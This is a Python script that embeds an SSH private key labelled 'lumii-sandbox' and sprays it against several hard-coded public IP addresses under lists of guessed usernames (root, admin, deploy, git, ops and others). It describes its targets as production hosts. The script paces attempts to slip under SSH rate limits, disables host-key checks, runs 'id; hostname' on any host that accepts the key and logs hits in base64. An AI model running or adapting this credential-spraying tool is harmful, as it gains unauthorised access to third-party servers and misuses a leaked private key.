#!/usr/bin/env python3
# i29157 run B: retest rate-limited combos + extra plausible usernames, paced to avoid MaxStartups.
import os, sys, json, time, base64, subprocess, socket

KEY = '''-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACAf3KrQcqBwHLpn3wjxr5qdaEKLh1pnjDAoOWpKYqdI3gAAAJDEwff2xMH3
9gAAAAtzc2gtZWQyNTUxOQAAACAf3KrQcqBwHLpn3wjxr5qdaEKLh1pnjDAoOWpKYqdI3g
AAAECjyFtXIWWBXxkN1pxm8CPtQex6pYF/A1nYr+H1JCVSRx/cqtByoHAcumffCPGvmp1o
QouHWmeMMCg5akpip0jeAAAADWx1bWlpLXNhbmRib3g=
-----END OPENSSH PRIVATE KEY-----
'''
T0 = time.time()
def el(): return int(time.time() - T0)
def R(k, v):
    s = v if isinstance(v, str) else json.dumps(v, ensure_ascii=False, default=str)
    print("R:%s:%s" % (k, base64.b64encode(s.encode("utf-8", "replace")).decode()), flush=True)
def run(cmd, timeout=20):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, timeout=timeout)
        return p.returncode, p.stdout.decode("utf-8", "replace"), p.stderr.decode("utf-8", "replace")
    except subprocess.TimeoutExpired:
        return -9, "", "TIMEOUT"
    except Exception as e:
        return -1, "", repr(e)

def ssh_auth(h, u, key, cmd="id; hostname", to=10):
    sc = ("ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
          "-o ConnectTimeout=%d -o IdentitiesOnly=yes -o PreferredAuthentications=publickey "
          "-o NumberOfPasswordPrompts=0 -i %s %s@%s '%s' 2>&1" % (to, key, u, h, cmd))
    rc, out, err = run(sc, to + 16)
    txt = (out + err).strip()
    ok = (rc == 0) or ("uid=" in txt)
    return {"rc": rc, "ok": ok, "txt": txt[:300]}

# rate-limited combos from run A that were never cleanly tested
RETEST = [("122.51.1.87", "deploy"), ("122.51.1.87", "git"), ("122.51.1.87", "admin"),
          ("81.68.254.22", "deploy"), ("81.68.254.22", "git"), ("81.68.254.22", "admin"),
          ("43.134.173.45", "deploy"), ("43.134.173.45", "git"), ("43.134.173.45", "admin"),
          ("49.235.41.58", "root"), ("49.235.41.58", "admin")]
# extra plausible usernames on the two primary prod hosts + aro-ops
EXTRA = [("122.51.1.87", u) for u in ["lumii-sandbox", "lumi", "ops", "stage", "prod", "lianchuang", "lumii-ai"]]
EXTRA += [("43.142.238.91", u) for u in ["lumii-sandbox", "lumi", "ops", "stage", "deploy", "git", "admin"]]

def main():
    kp = "/tmp/probe_key"; open(kp, "w").write(KEY); os.chmod(kp, 0o600)
    rc, out, err = run("ssh-keygen -y -f %s" % kp, 15)
    R("KEYGEN2", {"rc": rc, "matches_lumii_sandbox": out.strip().endswith("lumii-sandbox")})
    allt = RETEST + EXTRA
    hits = {}
    for h, u in allt:
        if el() > 1100: R("BUDGET", {"elapsed": el(), "at": "%s@%s" % (u, h)}); break
        r = ssh_auth(h, u, kp)
        R("AUTHB_%s_%s" % (h.replace(".", "_"), u), {"u": u, "h": h, "ok": r["ok"], "rc": r["rc"], "txt": r["txt"]})
        if r["ok"]:
            hits["%s@%s" % (u, h)] = r["txt"]
        time.sleep(4)  # pace to avoid MaxStartups/rate-limit
    R("RUNB_DONE", {"elapsed": el(), "tested": len(allt), "hits": hits})

try:
    main()
except Exception:
    import traceback; R("FATAL2", traceback.format_exc()[-2000:])
finally:
    R("END2", {"elapsed": el()}); sys.exit(1)
